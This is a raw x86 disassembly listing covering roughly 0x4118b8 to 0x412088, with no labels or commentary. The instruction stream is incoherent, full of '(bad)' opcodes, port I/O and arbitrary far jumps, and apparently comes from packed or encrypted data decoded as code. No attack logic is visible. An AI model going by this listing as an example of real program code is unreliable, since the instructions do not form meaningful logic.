  4118b8:	es fsubr st,st(6)
  4118bb:	xchg   edx,eax
  4118bc:	add    DWORD PTR [edx],0xf4269ff
  4118c2:	cmp    DWORD PTR [edx+0x1e],0xd2eef4e
  4118c9:	ret    0x18b0
  4118cc:	push   ebx
  4118cd:	clc    
  4118ce:	pusha  
  4118cf:	mov    ecx,0x9c44f4e5
  4118d4:	xchg   ebp,eax
  4118d5:	sbb    BYTE PTR [edi-0x11ad7da2],dl
  4118db:	pop    edx
  4118dc:	clc    
  4118dd:	enter  0xdbe8,0x6f
  4118e1:	fimul  WORD PTR [edi]
  4118e3:	stc    
  4118e4:	mov    ds:0x77f5e8e0,al
  4118e9:	retf   0xa83e
  4118ec:	xchg   esp,eax
  4118ed:	mov    bl,0xbd
  4118ef:	jns    0x411886
  4118f1:	push   0xffffffe2
  4118f3:	inc    eax
  4118f4:	dec    esi
  4118f5:	nop
  4118f6:	add    al,0x8a
  4118f8:	ret    0x39dc
  4118fb:	xchg   ah,bh
  4118fd:	and    eax,0x63c4741a
  411902:	mov    edi,0xf0ba413b
  411907:	test   DWORD PTR [edx+0x7d],edx
  41190a:	pop    ss
  41190b:	fwait
  41190c:	cmp    ebp,DWORD PTR [eax-0x78d98f1f]
  411912:	and    BYTE PTR [edi*2-0x1550cd77],bl
  411919:	imul   edx,DWORD PTR [eax-0x3c],0x9248ac4c
  411920:	adc    bh,BYTE PTR [edi+ebx*8-0x7d]
  411924:	test   DWORD PTR [ebp+ecx*1+0x51],edi
  411928:	daa    
  411929:	ss jge 0x411992
  41192c:	hlt    
  41192d:	inc    edx
  41192e:	mov    al,ds:0xaf00ef8b
  411933:	pop    ss
  411934:	xlat   BYTE PTR ds:[ebx]
  411935:	jno    0x41196b
  411937:	and    DWORD PTR [ebx],esi
  411939:	adc    al,BYTE PTR [edi]
  41193b:	lahf   
  41193c:	xchg   esp,eax
  41193d:	in     eax,dx
  41193e:	mov    dl,0x7a
  411940:	dec    eax
  411941:	jge    0x411979
  411943:	lods   al,BYTE PTR ds:[esi]
  411944:	into   
  411945:	and    dl,cl
  411947:	dec    esp
  411948:	and    ebx,esi
  41194a:	loop   0x411940
  41194c:	aam    0x97
  41194e:	push   0xffffffc3
  411950:	inc    edi
  411951:	cmp    bh,cl
  411953:	jne    0x411914
  411955:	adc    esi,esp
  411957:	test   BYTE PTR [ebx-0x5484d625],al
  41195d:	sub    al,0x62
  41195f:	or     al,0x65
  411961:	mov    ebp,0x4d9effa2
  411966:	mov    dh,BYTE PTR [esi-0x66]
  411969:	push   es
  41196a:	je     0x41198a
  41196c:	popa   
  41196d:	jne    0x411906
  41196f:	mov    ah,0x38
  411971:	out    dx,eax
  411972:	iret   
  411973:	repnz out dx,al
  411975:	xor    al,0x56
  411977:	mov    ebx,0x9ddc60c6
  41197c:	cli    
  41197d:	cmp    al,0xa5
  41197f:	sub    DWORD PTR [edx],eax
  411981:	mov    esi,0x1646a84f
  411986:	cmc    
  411987:	or     eax,0xb1b53aa3
  41198c:	adc    al,BYTE PTR [eax]
  41198e:	mov    edi,0x2fa01a26
  411993:	ds mov dh,0xd8
  411996:	or     al,0xdd
  411998:	cld    
  411999:	add    eax,DWORD PTR [edx-0x167eaa0c]
  41199f:	cmp    ebx,0xa44bad21
  4119a5:	call   0x8c4a3ae
  4119aa:	out    0x80,al
  4119ac:	dec    esp
  4119ad:	ret    0x853b
  4119b0:	jns    0x4119f9
  4119b2:	icebp  
  4119b3:	in     eax,0xf0
  4119b5:	jg     0x4119ca
  4119b7:	ins    BYTE PTR es:[edi],dx
  4119b8:	add    ch,ch
  4119ba:	sar    DWORD PTR ds:0xa961e7,1
  4119c0:	and    eax,0xba7b77df
  4119c5:	mov    al,ds:0x378b0ca
  4119ca:	aam    0xcf
  4119cc:	mov    al,0xb1
  4119ce:	or     al,0xe7
  4119d0:	dec    ebp
  4119d1:	(bad)  
  4119d2:	adc    al,0x55
  4119d4:	cwde   
  4119d5:	dec    esp
  4119d6:	dec    esi
  4119d7:	push   edi
  4119d8:	lahf   
  4119d9:	jmp    0xeb08:0xb2a20df8
  4119e0:	mov    bl,0xd8
  4119e2:	mov    dl,0x38
  4119e4:	xor    ebp,ebx
  4119e6:	int    0x20
  4119e8:	xchg   edi,eax
  4119e9:	aas    
  4119ea:	mov    dh,0x8f
  4119ec:	xor    BYTE PTR [ebx+ebx*8-0x5fc26534],dh
  4119f3:	cli    
  4119f4:	clc    
  4119f5:	and    eax,0xafa2f64c
  4119fa:	cmp    BYTE PTR [edx],al
  4119fc:	loop   0x4119ea
  4119fe:	and    ah,cl
  411a00:	push   edi
  411a01:	mov    bl,ch
  411a03:	jg     0x4119f1
  411a05:	pop    ebp
  411a06:	sub    DWORD PTR [esi],eax
  411a08:	inc    ecx
  411a09:	gs xchg ecx,eax
  411a0b:	sub    edi,DWORD PTR [eax-0x549f6e79]
  411a11:	lea    esi,[eax+0x66134e07]
  411a17:	xchg   cl,bl
  411a19:	ret    
  411a1a:	psadbw mm0,QWORD PTR [ebx]
  411a1d:	es mov dh,0x91
  411a20:	jnp    0x411a3e
  411a22:	sar    ecx,0x6b
  411a25:	loope  0x411a95
  411a27:	repz or BYTE PTR [edi+0x3cd90db4],dl
  411a2e:	jecxz  0x411a44
  411a30:	(bad)  
  411a31:	loopne 0x411a62
  411a33:	mov    dh,0xa7
  411a35:	mov    ds:0x943f788,al
  411a3a:	leave  
  411a3b:	jo     0x411a53
  411a3d:	sbb    al,0xd2
  411a3f:	lods   al,BYTE PTR ds:[esi]
  411a40:	in     eax,dx
  411a41:	adc    BYTE PTR [ecx],dl
  411a43:	out    dx,eax
  411a44:	push   ds
  411a45:	popf   
  411a46:	add    dh,ah
  411a48:	clc    
  411a49:	popf   
  411a4a:	lock fimul WORD PTR [ebx-0x6f]
  411a4f:	jbe    0x4119f8
  411a51:	jmp    0xf045:0x6898aec6
  411a58:	pop    esp
  411a59:	js     0x4119f6
  411a5b:	imul   edi,DWORD PTR [ecx-0x4f],0xffffff85
  411a5f:	retf   0x87a3
  411a62:	mov    ebp,0x24881801
  411a67:	adc    dl,cl
  411a69:	imul   ebp,DWORD PTR [esi+0x46b68576],0x88fe025f
  411a73:	jge    0x411a49
  411a75:	jno    0x411a51
  411a77:	push   esi
  411a78:	mov    BYTE PTR ds:0xe1bdaae5,dh
  411a7e:	mov    ecx,0x3ed3688f
  411a83:	or     esp,DWORD PTR [esi+0x56]
  411a86:	into   
  411a87:	mov    ds,WORD PTR [ecx]
  411a89:	jno    0x411a3f
  411a8b:	ins    BYTE PTR es:[edi],dx
  411a8c:	lods   al,BYTE PTR ds:[esi]
  411a8d:	les    edi,FWORD PTR [esi+0x3]
  411a90:	push   esp
  411a91:	jp     0x411a58
  411a93:	loopne 0x411acb
  411a95:	outs   dx,DWORD PTR ds:[esi]
  411a96:	repz add DWORD PTR [eax-0x6c],esp
  411a9a:	mov    ds:0x3f89d457,al
  411a9f:	outs   dx,BYTE PTR ds:[esi]
  411aa0:	cs jmp 0x411a59
  411aa3:	aad    0x69
  411aa5:	cld    
  411aa6:	and    eax,0x9d2a65de
  411aab:	daa    
  411aac:	pop    edx
  411aad:	out    0xb7,eax
  411aaf:	shl    BYTE PTR [eax+0x1e],cl
  411ab2:	mov    esi,0xd2bd3f44
  411ab7:	jno    0x411a7c
  411ab9:	push   es
  411aba:	sub    eax,0x1a96dc27
  411abf:	imul   edx,DWORD PTR [ebx+0x1da81703],0xc7fc84c3
  411ac9:	mov    bh,0x58
  411acb:	inc    esp
  411acc:	idiv   BYTE PTR [esi-0x76]
  411acf:	inc    ecx
  411ad0:	fist   WORD PTR [ecx-0x4b]
  411ad3:	aas    
  411ad4:	dec    esp
  411ad5:	ret    
  411ad6:	push   cs
  411ad7:	dec    eax
  411ad8:	xchg   ecx,eax
  411ad9:	push   ds
  411ada:	sub    BYTE PTR [eax],ah
  411adc:	jge    0x411a91
  411ade:	push   0x3ab6396c
  411ae3:	jmp    esp
  411ae5:	pop    es
  411ae6:	mov    al,ds:0x14a5b874
  411aeb:	mov    bl,0x4b
  411aed:	push   eax
  411aee:	push   eax
  411aef:	daa    
  411af0:	shr    DWORD PTR [edx],1
  411af2:	dec    esi
  411af3:	aam    0x9
  411af5:	mov    al,BYTE PTR [esi]
  411af7:	xchg   esp,eax
  411af8:	push   ebp
  411af9:	push   edx
  411afa:	sub    BYTE PTR [eax+esi*4],ah
  411afd:	dec    ecx
  411afe:	inc    edi
  411aff:	(bad)  
  411b00:	int    0x5e
  411b02:	in     al,dx
  411b03:	and    esi,DWORD PTR [edi-0x49]
  411b06:	inc    esi
  411b07:	xchg   edx,eax
  411b08:	add    al,0x4a
  411b0a:	(bad)  [ebx+0x21]
  411b0d:	out    dx,eax
  411b0e:	push   ss
  411b0f:	aas    
  411b10:	sub    al,BYTE PTR [ebx+ebx*1]
  411b13:	dec    edx
  411b14:	repnz int 0x5c
  411b17:	push   es
  411b18:	std    
  411b19:	std    
  411b1a:	and    dl,al
  411b1c:	shl    DWORD PTR [ecx],cl
  411b1e:	mov    al,0x58
  411b20:	jo     0x411b75
  411b22:	add    eax,0xde7bf6f5
  411b27:	ret    
  411b28:	leave  
  411b29:	jp     0x411ad1
  411b2b:	jbe    0x411aec
  411b2d:	(bad)  
  411b2e:	mov    ebp,0x8b8d26f2
  411b33:	jno    0x411ae0
  411b35:	mov    WORD PTR [ebx-0x4d2e1587],gs
  411b3b:	out    0x5e,eax
  411b3d:	js     0x411ae4
  411b3f:	fnstenv [ecx]
  411b41:	push   ss
  411b42:	jp     0x411af2
  411b44:	xor    eax,0xff30e0dc
  411b49:	sbb    BYTE PTR [ebx-0xa7a276],dh
  411b4f:	xchg   esi,eax
  411b50:	push   0x1a
  411b52:	cmp    DWORD PTR [esi],0x5519c12d
  411b58:	pop    edi
  411b59:	sbb    ebx,DWORD PTR [ebp-0x604a9528]
  411b5f:	add    DWORD PTR [eax-0x52],edi
  411b62:	fld1   
  411b64:	js     0x411b1d
  411b66:	and    al,0xc
  411b68:	dec    ebx
  411b69:	ins    BYTE PTR es:[edi],dx
  411b6a:	sbb    DWORD PTR [edi],esp
  411b6c:	retf   
  411b6d:	add    BYTE PTR [ecx-0x13e3e4cc],dh
  411b73:	inc    edx
  411b74:	adc    eax,0xc88b1793
  411b79:	and    eax,0xfd4485a1
  411b7e:	aaa    
  411b7f:	inc    edx
  411b80:	sub    edi,DWORD PTR [edi-0x62]
  411b83:	hlt    
  411b84:	aam    0x20
  411b86:	popa   
  411b87:	pop    edx
  411b88:	jl     0x411b70
  411b8a:	xor    esi,DWORD PTR [ecx]
  411b8c:	jb     0x411b9a
  411b8e:	sti    
  411b8f:	and    dl,BYTE PTR [ebx+ebx*4+0x18]
  411b93:	stos   DWORD PTR es:[edi],eax
  411b94:	jae    0x411c0f
  411b96:	cmc    
  411b97:	jg     0x411b7b
  411b99:	jne    0x411bb4
  411b9b:	daa    
  411b9c:	add    DWORD PTR [edi],ebx
  411b9e:	std    
  411b9f:	stos   BYTE PTR es:[edi],al
  411ba0:	iret   
  411ba1:	pushf  
  411ba2:	popa   
  411ba3:	mov    ebx,0x7279e370
  411ba8:	add    BYTE PTR [ecx],ah
  411baa:	(bad)  
  411bab:	repnz push ecx
  411bad:	retf   
  411bae:	jp     0x411bb5
  411bb0:	adc    eax,0xa1b4127b
  411bb5:	aaa    
  411bb6:	mov    eax,ds:0xea9247bc
  411bbb:	jge    0x411bea
  411bbd:	(bad)  
  411bbe:	or     edx,DWORD PTR [ebx+0x69]
  411bc1:	mov    ebp,DWORD PTR cs:[edi+0x4e50a0a1]
  411bc8:	xlat   BYTE PTR ds:[ebx]
  411bc9:	jmp    0x22c2:0x5bc13a9a
  411bd0:	ja     0x411c05
  411bd2:	xchg   edx,eax
  411bd3:	push   ebp
  411bd4:	mov    edi,edx
  411bd6:	pop    edi
  411bd7:	bt     DWORD PTR [edx+0x26],edi
  411bdb:	fidiv  DWORD PTR [esi-0x4e6cf31]
  411be1:	adc    dl,0xd1
  411be4:	ss pop esp
  411be6:	add    ecx,0xf6a83b2a
  411bec:	(bad)  
  411bed:	mov    ecx,DWORD PTR [edi+0x5f3b11eb]
  411bf3:	clc    
  411bf4:	jg     0x411bd4
  411bf6:	in     eax,0xc3
  411bf8:	aam    0x36
  411bfa:	cmp    eax,0xaf972dc1
  411bff:	mov    ebx,0xfd015445
  411c05:	xor    DWORD PTR [edx],ebx
  411c07:	jne    0x411bf0
  411c09:	jo     0x411bf7
  411c0b:	(bad)  
  411c0c:	int    0xaa
  411c0e:	aam    0x91
  411c10:	xlat   BYTE PTR ds:[ebx]
  411c11:	imul   bl
  411c13:	jns    0x411c85
  411c15:	pop    ss
  411c16:	scas   eax,DWORD PTR es:[edi]
  411c17:	pop    eax
  411c18:	sub    ah,BYTE PTR [edi+0x3c87b590]
  411c1e:	test   eax,0x19c50b4e
  411c23:	or     dl,BYTE PTR [edx+0x30]
  411c26:	inc    edx
  411c27:	push   eax
  411c28:	inc    esp
  411c29:	inc    ecx
  411c2a:	ror    al,1
  411c2c:	sar    dl,1
  411c2e:	(bad)  
  411c2f:	jo     0x411bff
  411c31:	pop    esi
  411c32:	adc    DWORD PTR [ebx],esp
  411c34:	icebp  
  411c35:	and    edx,DWORD PTR [esi-0x11]
  411c38:	pop    ss
  411c39:	xlat   BYTE PTR ds:[ebx]
  411c3a:	inc    edx
  411c3b:	in     al,dx
  411c3c:	test   eax,0x9b5dc96f
  411c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c42:	pop    edi
  411c43:	jecxz  0x411ca9
  411c45:	lea    edx,[eax+ecx*2+0xb8cc584]
  411c4c:	and    eax,0xdb6cfe08
  411c51:	je     0x411c66
  411c53:	or     eax,0x72eff2d1
  411c58:	push   ss
  411c59:	jp     0x411c69
  411c5b:	pop    esi
  411c5c:	xor    DWORD PTR [ebx-0x7b],ebp
  411c5f:	loopne 0x411c93
  411c61:	cmovo  ecx,eax
  411c64:	push   ebx
  411c65:	xor    ch,BYTE PTR [esi+0x45]
  411c68:	mov    edx,0x3c53263e
  411c6d:	add    al,0xd5
  411c6f:	into   
  411c70:	xchg   esi,eax
  411c71:	pop    ecx
  411c72:	call   0x6011:0x40edc2df
  411c79:	jne    0x411c2d
  411c7b:	adc    esi,esp
  411c7d:	jmp    0x411c1e
  411c7f:	std    
  411c80:	pop    esp
  411c81:	dec    ebx
  411c82:	and    eax,0x7cda0bce
  411c87:	iret   
  411c88:	and    BYTE PTR [ecx-0x46],0xbe
  411c8c:	aad    0x8
  411c8e:	push   edx
  411c8f:	xor    dh,BYTE PTR [ecx+ebx*1+0x1b]
  411c93:	and    BYTE PTR [ecx],0xa3
  411c96:	pop    ds
  411c97:	add    BYTE PTR [eax+0x9],dh
  411c9a:	jmp    0xa3fdff22
  411c9f:	imul   edx,DWORD PTR [esi],0xfce045fa
  411ca5:	pop    esi
  411ca6:	mul    DWORD PTR [ebx]
  411ca8:	mov    DWORD PTR [esi+0xbd2703],0xd9d9ac3
  411cb2:	mov    al,ds:0xbc34d45b
  411cb7:	rol    BYTE PTR [eax+0x4465bf19],0x97
  411cbe:	inc    edx
  411cbf:	jns    0x411d3d
  411cc1:	cmp    al,0xae
  411cc3:	xor    dl,BYTE PTR [ecx+0x71]
  411cc6:	or     ecx,esp
  411cc8:	outs   dx,BYTE PTR ds:[esi]
  411cc9:	out    dx,al
  411cca:	pusha  
  411ccb:	shl    ch,1
  411ccd:	or     al,dl
  411ccf:	cmp    cl,BYTE PTR [ebx]
  411cd1:	mov    ds:0xfb5460f2,al
  411cd6:	push   0xdd7881c8
  411cdb:	popf   
  411cdc:	adc    DWORD PTR [edx-0x41cf744e],ecx
  411ce2:	aaa    
  411ce3:	stos   DWORD PTR es:[edi],eax
  411ce4:	fs js  0x411c92
  411ce7:	ds xor al,cl
  411cea:	mov    DWORD PTR [esi+0x85fbccb],ebp
  411cf0:	imul   ebp,DWORD PTR [edi+0x508a6e0e],0xc4b48666
  411cfa:	push   ebx
  411cfb:	dec    ecx
  411cfc:	repz daa 
  411cfe:	fstp   st(1)
  411d00:	push   ds
  411d01:	sbb    eax,0xa7533ac7
  411d06:	add    ebx,DWORD PTR [esi+ecx*2-0x2d]
  411d0a:	jmp    0x30bfd0d1
  411d0f:	repnz inc edx
  411d11:	mov    dl,bh
  411d13:	es dec edx
  411d15:	test   BYTE PTR [ecx+0x61],bl
  411d18:	add    ch,BYTE PTR [esi-0x3f]
  411d1b:	or     al,0x24
  411d1d:	iret   
  411d1e:	out    0x3b,eax
  411d20:	or     BYTE PTR [edx+0x69],ch
  411d23:	mov    ebp,0x3fc6c451
  411d28:	mov    ecx,DWORD PTR [edx-0x3f]
  411d2b:	and    eax,0x9e399694
  411d30:	mov    cl,0x4a
  411d32:	loopne 0x411d66
  411d34:	ins    DWORD PTR es:[edi],dx
  411d35:	add    esi,DWORD PTR [eax]
  411d37:	ja     0x411d3b
  411d39:	jge    0x411cdf
  411d3b:	inc    esp
  411d3c:	ss push ecx
  411d3e:	ja     0x411d2b
  411d40:	add    eax,0xd1992871
  411d45:	cmp    BYTE PTR [ecx],0xb6
  411d48:	aas    
  411d49:	jp     0x411cfe
  411d4b:	dec    ebp
  411d4c:	jo     0x411d4d
  411d4e:	jg     0x411dc8
  411d50:	mov    WORD PTR [edi+0x2c],es
  411d53:	data16 fstp DWORD PTR [esi-0x1d]
  411d57:	ret    
  411d58:	mov    ebx,0xb28d0ac5
  411d5d:	dec    esi
  411d5e:	jbe    0x411cf6
  411d60:	inc    esp
  411d61:	shr    BYTE PTR [edx+0x2c],1
  411d64:	cmp    eax,0x4c550277
  411d69:	(bad)  
  411d6a:	mov    al,ds:0x76bf61ef
  411d6f:	inc    ecx
  411d70:	cmp    al,0x44
  411d72:	mov    edi,0xd590be9a
  411d77:	push   esp
  411d78:	fsub   QWORD PTR [ebp+0x58a1ad2f]
  411d7e:	dec    edx
  411d7f:	mov    ebx,DWORD PTR [ebx-0x15]
  411d82:	out    dx,eax
  411d83:	mov    al,0x77
  411d85:	jo     0x411e00
  411d87:	(bad)  
  411d88:	aaa    
  411d89:	pop    eax
  411d8a:	xchg   ebp,eax
  411d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d8c:	pop    edx
  411d8d:	pop    esi
  411d8e:	imul   ebp,DWORD PTR [eax+0x454b8bfc],0x38
  411d95:	fs mov al,0x51
  411d98:	in     al,dx
  411d99:	lods   eax,DWORD PTR ds:[esi]
  411d9a:	cmp    al,0xf
  411d9c:	fst    st(3)
  411d9e:	mov    esi,0xaf45da5a
  411da3:	push   esi
  411da4:	jg     0x411d3a
  411da6:	jns    0x411db4
  411da8:	scas   eax,DWORD PTR es:[edi]
  411da9:	mov    edi,0x36966b5d
  411dae:	add    DWORD PTR ds:[esi-0x2],ebp
  411db2:	cs push cs
  411db4:	mov    ah,0x83
  411db6:	mov    esp,0xa69c0258
  411dbb:	(bad)  
  411dbc:	rcr    BYTE PTR [edi+0x31109184],0xaa
  411dc3:	mov    WORD PTR [edx+0x361115b3],fs
  411dc9:	mov    al,ds:0x670789c5
  411dce:	pusha  
  411dcf:	sub    edx,DWORD PTR [ecx-0x1f356fd7]
  411dd5:	jno    0x411d66
  411dd7:	jmp    0x411dc5
  411dd9:	push   edx
  411dda:	scas   al,BYTE PTR es:[edi]
  411ddb:	fisubr DWORD PTR [ebx+0x74bd6c28]
  411de1:	push   ebp
  411de2:	stc    
  411de3:	adc    eax,0x79371580
  411de8:	call   0x59a86eb
  411ded:	ffree  st(7)
  411def:	lds    edi,FWORD PTR [ecx]
  411df1:	or     al,BYTE PTR ds:0x3566a2ea
  411df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411df8:	(bad)  
  411df9:	sti    
  411dfa:	loopne 0x411e61
  411dfc:	dec    ebp
  411dfd:	and    cl,BYTE PTR [ebp-0x5ebdf649]
  411e03:	mov    ebp,0xbbd87761
  411e08:	and    ebp,ebx
  411e0a:	adc    eax,0x395b5608
  411e0f:	dec    ebx
  411e10:	mov    ah,0xc3
  411e12:	cwde   
  411e13:	push   0x31
  411e15:	mov    ch,0x69
  411e17:	data16 aad 0xf1
  411e1a:	int    0x9a
  411e1c:	jne    0x411e26
  411e1e:	fwait
  411e1f:	inc    esp
  411e20:	cmp    ebp,DWORD PTR [edi]
  411e22:	cmp    ebx,0xc402e319
  411e28:	push   ebx
  411e29:	xor    al,BYTE PTR [esi+0x4caf6488]
  411e2f:	adc    al,0x1
  411e31:	jae    0x411e0f
  411e33:	add    bh,BYTE PTR [edx+0x4b30de9e]
  411e39:	fcomp  DWORD PTR [edx]
  411e3b:	clc    
  411e3c:	ins    BYTE PTR es:[edi],dx
  411e3d:	(bad)  
  411e3e:	jl     0x411de2
  411e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e41:	adc    al,0xa9
  411e43:	xor    eax,DWORD PTR [ecx+0x32154bd]
  411e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e4a:	aam    0xe
  411e4c:	push   ds
  411e4d:	mov    ebx,0x4c353fa1
  411e52:	sub    ecx,ebp
  411e54:	aad    0xe1
  411e56:	pop    ebx
  411e57:	xor    cl,bh
  411e59:	xor    eax,0xa95ccdbf
  411e5e:	push   edi
  411e5f:	push   ebp
  411e60:	repz sbb DWORD PTR ds:[edx+0x46ae36d6],eax
  411e68:	xchg   edi,eax
  411e69:	les    eax,FWORD PTR [esi-0x42]
  411e6c:	add    ecx,ebp
  411e6e:	dec    ebp
  411e6f:	pop    ecx
  411e70:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e72:	cmp    eax,0xebea4505
  411e77:	mov    edi,DWORD PTR [esi+0x3b32f505]
  411e7d:	add    dl,BYTE PTR [ecx]
  411e7f:	push   edx
  411e80:	add    DWORD PTR [eax+0x75],ebx
  411e83:	out    0xac,al
  411e85:	rcr    DWORD PTR [esi+ecx*2+0x4961dcad],0x1e
  411e8d:	loop   0x411e33
  411e8f:	fcomp  QWORD PTR [edi-0x1f07cfb7]
  411e95:	jle    0x411e7e
  411e97:	sub    esi,eax
  411e99:	and    DWORD PTR [edi],0xb4890cb1
  411e9f:	mov    cl,0xa3
  411ea1:	test   al,0xa3
  411ea3:	call   0x12134252
  411ea8:	test   DWORD PTR [ebx-0x45e9547d],edi
  411eae:	jg     0x411efa
  411eb0:	fdivr  DWORD PTR [ecx]
  411eb2:	cmp    eax,0x833175a4
  411eb7:	push   ecx
  411eb8:	(bad)  
  411eb9:	fidiv  DWORD PTR [edx-0x29c9db02]
  411ebf:	and    BYTE PTR [ebx-0x1c505a02],ah
  411ec5:	or     al,0x61
  411ec7:	xor    dh,BYTE PTR [ebp+0x6a682a12]
  411ecd:	push   es
  411ece:	pop    edx
  411ecf:	out    dx,al
  411ed0:	dec    esi
  411ed1:	and    eax,0x2d979438
  411ed6:	jmp    0xd4f1272
  411edb:	ss es out dx,al
  411ede:	outs   dx,BYTE PTR ds:[esi]
  411edf:	cwde   
  411ee0:	rol    DWORD PTR [ecx+eax*1],cl
  411ee3:	test   DWORD PTR [ebx-0x14a49fe5],ebx
  411ee9:	ficom  WORD PTR [edx-0x49]
  411eec:	fst    DWORD PTR [ebx+0x2a]
  411eef:	rep stos DWORD PTR es:[edi],eax
  411ef1:	push   ebx
  411ef2:	fs cmp esi,eax
  411ef5:	jge    0x411f32
  411ef7:	jl     0x411f63
  411ef9:	cwde   
  411efa:	or     al,0x38
  411efc:	xchg   ecx,eax
  411efd:	int    0x6f
  411eff:	aam    0xf6
  411f01:	ficom  WORD PTR [edi]
  411f03:	pushf  
  411f04:	lods   al,BYTE PTR ds:[esi]
  411f05:	call   0x323f:0x9981d161
  411f0c:	and    BYTE PTR [ebx-0xe],0xd8
  411f10:	loope  0x411eaa
  411f12:	dec    eax
  411f13:	mov    eax,ds:0x4cd2a587
  411f18:	gs push cs
  411f1a:	fwait
  411f1b:	sar    ebp,cl
  411f1d:	test   BYTE PTR [ebx-0x67],bl
  411f20:	inc    ecx
  411f21:	cli    
  411f22:	pusha  
  411f23:	(bad)  
  411f24:	add    DWORD PTR [ebp+0x1dc7c506],0xffffffba
  411f2b:	cmp    ch,BYTE PTR [ebx+0x72]
  411f2e:	aad    0x3a
  411f30:	fdivr  QWORD PTR [edi+ebx*1]
  411f33:	aas    
  411f34:	or     al,BYTE PTR [ecx]
  411f36:	pop    ebx
  411f37:	repnz mov ch,0x5c
  411f3a:	sub    ecx,DWORD PTR [eax-0x31]
  411f3d:	pop    eax
  411f3e:	or     edx,DWORD PTR [edx+0x2b]
  411f41:	xor    ah,BYTE PTR ds:0xadf8f587
  411f47:	lock aam 0x2
  411f4a:	(bad)  [eax+0x75]
  411f4d:	loop   0x411ed9
  411f4f:	mov    ebp,0x541db3c7
  411f54:	jmp    0xecc69e2c
  411f59:	ins    BYTE PTR es:[edi],dx
  411f5a:	sub    esp,DWORD PTR [ebx+edi*4]
  411f5d:	in     al,dx
  411f5e:	mov    edx,DWORD PTR [ecx+0x5cd03bc0]
  411f64:	(bad)  
  411f65:	cli    
  411f66:	mov    ah,0x3a
  411f68:	out    0x45,eax
  411f6a:	fwait
  411f6b:	add    eax,0x601b61a7
  411f70:	dec    esp
  411f71:	push   cs
  411f72:	xchg   edi,eax
  411f73:	jge    0x411f11
  411f75:	sub    bh,BYTE PTR [edi+0x29349391]
  411f7b:	xor    DWORD PTR [eax-0x29],edi
  411f7e:	(bad)  
  411f7f:	(bad)  
  411f80:	cmp    al,0x92
  411f82:	xchg   edi,eax
  411f83:	adc    al,0xf8
  411f85:	pop    esi
  411f86:	xor    DWORD PTR [eax-0x511e11a2],esi
  411f8c:	popa   
  411f8d:	enter  0xecb2,0x5d
  411f91:	out    dx,eax
  411f92:	add    al,0xac
  411f94:	pop    edx
  411f95:	addr16 (bad) 
  411f97:	jmp    0x8eae:0x60d89261
  411f9e:	or     ecx,DWORD PTR [ebp-0x31]
  411fa1:	shr    DWORD PTR ds:0x29cd4e97,0xd0
  411fa8:	adc    dl,BYTE PTR [esi+eiz*1+0x33]
  411fac:	xchg   BYTE PTR [edx],al
  411fae:	sbb    ecx,0x2b
  411fb1:	es out dx,al
  411fb3:	(bad)  
  411fb4:	xchg   esi,eax
  411fb5:	jns    0x41202c
  411fb7:	retf   0x5f15
  411fba:	push   esi
  411fbb:	cmp    BYTE PTR [edi-0x5aefd6df],bh
  411fc1:	jae    0x411fe6
  411fc3:	addr16 jb 0x411ff1
  411fc6:	leave  
  411fc7:	adc    al,0x5b
  411fc9:	jmp    FWORD PTR [ecx+ebx*1-0x7e]
  411fcd:	push   es
  411fce:	jge    0x411f70
  411fd0:	pop    esp
  411fd1:	mov    ah,0xcd
  411fd3:	dec    esp
  411fd4:	stos   BYTE PTR es:[edi],al
  411fd5:	push   ss
  411fd6:	nop
  411fd7:	pop    ebx
  411fd8:	xchg   ecx,eax
  411fd9:	sbb    ch,ch
  411fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fdc:	sub    ch,BYTE PTR [ebx-0x54b70310]
  411fe2:	inc    esp
  411fe3:	iret   
  411fe4:	int    0x68
  411fe6:	imul   eax,DWORD PTR [edi+eiz*2],0x45
  411fea:	mov    es,WORD PTR [ebp+0x600ba5e7]
  411ff0:	push   ebp
  411ff1:	daa    
  411ff2:	mov    al,0x39
  411ff4:	popf   
  411ff5:	pop    edx
  411ff6:	mov    edx,0xa6eaee09
  411ffb:	loop   0x41205e
  411ffd:	jp     0x411fa8
  411fff:	cs push 0xfffffff1
  412002:	or     DWORD PTR [ebp+0x30],eax
  412005:	cmp    DWORD PTR [edi],ecx
  412007:	jne    0x411ff0
  412009:	ret    
  41200a:	cs xchg esi,eax
  41200c:	stos   BYTE PTR es:[edi],al
  41200d:	sbb    ah,al
  41200f:	add    BYTE PTR [ecx+ebp*8-0x75556c21],bl
  412016:	aaa    
  412017:	push   ebp
  412018:	jno    0x411fa3
  41201a:	(bad)  
  41201b:	cwde   
  41201c:	push   eax
  41201d:	mov    edx,0x9200708e
  412022:	or     eax,0xcd4fc71d
  412027:	pop    ecx
  412028:	loopne 0x411fe9
  41202a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41202b:	mov    bh,0x2e
  41202d:	lea    ecx,[esi]
  41202f:	mov    bh,0x62
  412031:	dec    ebx
  412032:	dec    esi
  412033:	clc    
  412034:	pusha  
  412035:	mov    esi,0x4a7abcf0
  41203a:	jbe    0x41207f
  41203c:	sbb    eax,0x6d6e4f81
  412041:	daa    
  412042:	dec    esi
  412043:	ret    
  412044:	adc    eax,0xc2f92895
  412049:	sbb    eax,0xb083d7fb
  41204e:	es (bad) 
  412050:	lock in al,dx
  412052:	add    BYTE PTR [ecx],cl
  412054:	xchg   edi,eax
  412055:	xor    ah,ch
  412057:	(bad)  
  412059:	push   ds
  41205a:	imul   ecx,esp,0x13a8b50b
  412060:	inc    edi
  412061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412062:	xchg   esp,eax
  412063:	scas   al,BYTE PTR es:[edi]
  412064:	stos   BYTE PTR es:[edi],al
  412065:	rcl    BYTE PTR [ebp+esi*8+0x17093caf],0x10
  41206d:	out    dx,eax
  41206e:	mov    eax,0x39d50cc5
  412073:	xchg   ebx,eax
  412074:	mov    dh,0xe0
  412076:	bound  edx,QWORD PTR [esi+0x70366941]
  41207c:	cld    
  41207d:	out    dx,eax
  41207e:	and    BYTE PTR [esi],al
  412080:	xchg   edx,eax
  412081:	adc    BYTE PTR [eax+0x35],bh
  412084:	sbb    bl,0x3a
  412087:	xchg   esi,eax
  412088:	sti    
